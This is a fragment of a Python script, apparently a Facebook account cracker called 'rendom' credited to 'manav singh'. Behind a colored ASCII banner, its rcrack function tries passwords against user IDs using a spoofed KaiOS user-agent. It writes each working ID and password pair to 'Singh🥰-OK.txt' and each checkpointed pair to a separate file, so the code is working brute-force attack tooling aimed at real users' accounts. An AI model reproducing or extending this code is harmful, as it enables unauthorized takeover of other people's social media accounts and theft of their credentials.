...
\_______)\_______/|/    )_)(_______)|/     \|
\033[1;33m----------------------------------------------
 \033[1;37mCREATER    : \033[1;36mmanav singh
 \033[1;35mGITHUB    : \033[1;35msingh-404
 \033[1;39mFACEBOOK  : \033[1;33mmanav singh
 \033[1;36mTOOL NAME : \033[1;34mrendom
...
def riaz():
	...
	if king1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100084375491672');riaz()
	if king1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[Singh🥰-OK] '+cid+'|'+ps+'\033[0;97m')
                open('Singh🥰-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[Singh😕-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('Singh😕-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mmanav singh\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
